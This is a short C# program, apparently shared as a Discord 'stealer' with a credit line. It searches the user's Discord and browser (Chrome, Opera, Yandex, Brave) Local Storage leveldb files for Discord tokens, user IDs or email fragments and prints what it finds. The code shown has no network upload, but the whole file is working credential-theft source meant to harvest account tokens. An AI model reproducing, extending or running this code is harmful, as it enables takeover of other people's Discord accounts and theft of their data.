using System;
using System.Collections;
using System.IO;

namespace stealer
{

//credit: lethia

    class Stealer
    {
        static void Main(string[] args)
        {

            foreach (String info in steal(SearchType.USER_ID))
            {
                Console.WriteLine(info);
            }

        }

        enum SearchType
        {
            TOKEN,
            EMAIL,
            USER_ID
        }

        static string toSteal(SearchType type)
        {
            if (type == SearchType.TOKEN)
            {
                return ">oken";
            }
            else if (type == SearchType.USER_ID)
            {
                return "user_id_cache";
            }
            else
            {
                return "email_cache";
            }
        }

        static ArrayList steal(SearchType type)
        {
            int start_time, elapsed_time;

            start_time = DateTime.Now.Millisecond;

            string[] paths = {
                Environment.GetFolderPath(Environment.SpecialFolder.UserProfile) + "/AppData/Roaming/Discord/Local Storage/leveldb/",
                Environment.GetFolderPath(Environment.SpecialFolder.UserProfile) + "/AppData/Roaming/discordptb/Local Storage/leveldb/",
                Environment.GetFolderPath(Environment.SpecialFolder.UserProfile) + "/AppData/Roaming/discordcanary/Local Storage/leveldb/",
                Environment.GetFolderPath(Environment.SpecialFolder.UserProfile) + "/AppData/Roaming/Opera Software/Opera Stable/User Data/Default/Local Storage/leveldb/",
                Environment.GetFolderPath(Environment.SpecialFolder.UserProfile) + "/AppData/Local/Google/Chrome/User Data/Default/Local Storage/leveldb/",
                Environment.GetFolderPath(Environment.SpecialFolder.UserProfile) + "/AppData/Local/Yandex/YandexBrowser/User Data/Default/Local Storage/leveldb/",
                Environment.GetFolderPath(Environment.SpecialFolder.UserProfile) + "/AppData/Local/BraveSoftware/Brave-Browser/User Data/Default/Local Storage/leveldb/",
            };

            var founds = new ArrayList();
            foreach (String path in paths)
            {
                if (Directory.Exists(path))
                {
                    foreach (FileInfo fileInfo in new DirectoryInfo(path).GetFiles())
                    {
                        if (fileInfo.Name.EndsWith(".ldb"))
                        {
                            string content = File.ReadAllText(fileInfo.FullName);
                            if (!content.Contains(toSteal(type)))
                            {
                                continue;
                            }
                            string remainingContent = content;
                            remainingContent = remainingContent.Substring(remainingContent.IndexOf(toSteal(type)));

                            string found = string.Empty;
                            if (type == SearchType.EMAIL)
                            {
                                found = remainingContent.Split("\"")[1].Split("@")[0] + "@hidden by discord";
                            }
                            if (type == SearchType.USER_ID)
                            {
                                found = remainingContent.Split("\"")[0].Split("}")[1].Substring(3);
                            }
                            if (type == SearchType.TOKEN)
                            {
                                found = remainingContent.Split("\"")[1];
                            }
                            if (founds.Contains(found))
                            {
                                continue;
                            }
                            founds.Add(found);
                        }
                    }
                }
            }

            int total_tokens_size = founds.Count;

            elapsed_time = DateTime.Now.Millisecond - start_time;

            if (total_tokens_size == 0)
            {
                founds.Add($"Nothing found, scanned {paths.Length} files, elapsed: {elapsed_time} ms (millisecond).");
            }
            else
            {
                founds.Add($"Found {total_tokens_size} {type}, scanned {paths.Length} discord paths, elapsed: {elapsed_time} ms (millisecond).");
            }
            return founds;
        }

    }
}
